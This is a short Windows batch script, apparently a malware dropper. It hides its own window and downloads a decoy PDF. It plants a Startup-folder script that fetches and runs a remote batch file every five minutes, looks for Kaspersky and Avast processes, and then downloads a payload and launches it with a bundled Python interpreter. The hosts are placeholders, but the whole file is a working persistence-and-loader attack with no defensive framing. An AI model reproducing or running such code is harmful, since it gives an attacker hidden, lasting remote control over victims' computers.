@echo off
if not "%~1"=="h" (
  powershell -WindowStyle Hidden -Command "Start-Process -FilePath '%~f0' -ArgumentList 'h %*' -WindowStyle Hidden"
  exit /b
)
set "NET=%SystemRoot%\System32\curl.exe"
set "store=%LOCALAPPDATA%\Example\Cache"
if not exist "!store!" mkdir "!store!"
"%NET%" -sf -o "!store!\guide.pdf" "https://example.test/guide.pdf"
> "%APPDATA%\Microsoft\Windows\Start Menu\Programs\StartUp\refresh.bat" (
echo @echo off
echo :again
echo "%NET%" -sf -o "!store!\run.bat" "https://example.test/update.txt"
echo call "!store!\run.bat"
echo ping -n 301 127.0.0.1 ^>nul
echo goto again
)
tasklist /fo csv /nh | findstr /i "avp.exe avastui.exe"
"%NET%" -sf -o "!store!\engine.pyd" "https://example.test/engine.pyd"
start "" /b "%LOCALAPPDATA%\Runtime\python.exe" "!store!\engine.pyd" "!store!\settings.dat"